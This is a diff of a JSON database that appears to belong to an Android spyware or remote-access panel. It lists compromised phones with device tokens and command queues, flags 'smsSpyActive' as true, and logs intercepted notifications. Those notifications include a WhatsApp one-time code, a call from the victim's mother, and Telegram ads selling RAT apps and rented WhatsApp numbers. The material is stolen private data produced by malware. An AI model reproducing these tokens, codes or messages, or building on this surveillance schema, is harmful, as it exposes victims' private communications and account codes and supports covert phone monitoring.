@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776778517848,
+    "lastSeen": 1776778520869,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776778519484,
+    "lastSeen": 1776778521327,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,150 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521820
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521797
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521681
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521579
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521560
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521543
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521479
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16865 pesan baru dari 118 obrolan",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521465
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521298
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521285
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521263
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521247
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521235
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521222
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16864 pesan baru dari 118 obrolan",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521061
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778521047
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778520695
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 20:35",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776778520680
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram: Pengguna",
@@ -14258,150 +14402,6 @@
         "time": "21/04 20:24",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776777887662
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: WHATSAPP\n🌍 Country: Indonesia\n📞 Number: +62********969\n💰 Price: Rp 3.600\n🔢 Code: 608133\n━━━━━━━━━━━━━━━\n📨 Message:\n Kode WhatsApp: 608-133\nJangan bagikan kode ini dengan orang lain\n4sgLq1p5sV6\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0008761166\n🏷️ System ID: FSCL82883660\n⏰ 21 Apr 2026 • 20:24 WIB\n\n#OTP #WHATSAPP",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777887557
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16807 pesan baru dari 118 obrolan",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777887522
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ROOM PUBLIK BY JEFF: Rose",
-        "content": "I've kicked Morlana $$$.",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777887422
-      },
-      {
-        "appName": "Telegram",
-        "sender": "⏤͟͟𝐀𝐅 || Jmbt Panjang",
-        "content": "━━━━━━━━━━━━━━━━━━━━━━━━━\n🔥✅ DONE TRX NOREFF YAA\n━━━━━━━━━━━━━━━━━━━━━━━━\n📦:  VPS R8C4 \n💸: 9K NEGO\n💳: NOPE\n📅: 2026-21\n━━━━━━━━━━━━━━━━━━━━━━━━━\nNYARI PANEL/ROLE LEGAL MURMER?\nPV @gas_buyy",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777887393
-      },
-      {
-        "appName": "Telegram",
-        "sender": "LearnTermuxHUB.Tools: 𝐃𝐈𝐓𝐙 𝐆𝐀𝐍𝐓𝐄𝐍𝐆",
-        "content": "APK BUG X RAT 5K PV @Napkxiua PERMANEN FULL UP",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777887289
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: WHATSAPP\n🌍 Country: Indonesia\n📞 Number: +62********969\n💰 Price: Rp 3.600\n🔢 Code: 608133\n━━━━━━━━━━━━━━━\n📨 Message:\n Kode WhatsApp: 608-133\nJangan bagikan kode ini dengan orang lain\n4sgLq1p5sV6\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0008761166\n🏷️ System ID: FSCL82883660\n⏰ 21 Apr 2026 • 20:24 WIB\n\n#OTP #WHATSAPP",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777887209
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5941 pesan baru dari 49 obrolan",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777887188
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: WhatsApp\n• Negara: Indonesia 🇮🇩\n• Server: Server (1)\n• Nomor: +6283*******26\n• Waktu: 21/04/2026, 20.23",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777887170
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mamah",
-        "content": "Panggilan telepon berlangsung",
-        "time": "21/04 20:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777855311
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Mamah",
-        "content": "Telepon suara masuk",
-        "time": "21/04 20:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776777855040
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Generate | Panel Free",
-        "content": "Gada yang request penambahan fitur lagi?",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777847458
-      },
-      {
-        "appName": "Telegram",
-        "sender": "⏤͟͟𝐀𝐅 || Jmbt Panjang",
-        "content": "━━━━━━━━━━━━━━━━━━━━━━━━━\n🔥✅ DONE TRX NOREFF YAA\n━━━━━━━━━━━━━━━━━━━━━━━━\n📦:  VPS R8C4 \n💸: 9K NEGO\n💳: NOPE\n📅: 2026-21\n━━━━━━━━━━━━━━━━━━━━━━━━━\nNYARI PANEL/ROLE LEGAL MURMER?\nPV @gas_buyy",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777847439
-      },
-      {
-        "appName": "Telegram",
-        "sender": "(苏) 𝗙𝗮𝗺𝗔𝘅𝗰𝗮𝗹⁶⁰⁵",
-        "content": "t.me/nft/XmasStocking-192966\n\n[70k] stars dari u",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777847422
-      },
-      {
-        "appName": "Telegram",
-        "sender": "GB PANEL PRIVATE WANZ: alzz new era",
-        "content": "@scarlatee19",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777847395
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Testimoni Gift",
-        "content": "🎉 User Baru Masuk!\n\n👤 Hanzyy 21\n🆔 8393746943\n⏰ 21/4/2026, 13.21.23",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777847375
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: WhatsApp\n• Negara: Indonesia 🇮🇩\n• Server: Server (1)\n• Nomor: +6283*******26\n• Waktu: 21/04/2026, 20.23",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777847225
-      },
-      {
-        "appName": "Telegram",
-        "sender": "SEWA WA BY LIFESTYLE😈: Rose",
-        "content": "Hey there KING777, and welcome to SEWA WA BY LIFESTYLE😈! How are you?",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777847206
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16806 pesan baru dari 118 obrolan",
-        "time": "21/04 20:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776777847095
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776778518243,
+    "lastSeen": 1776778521192,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
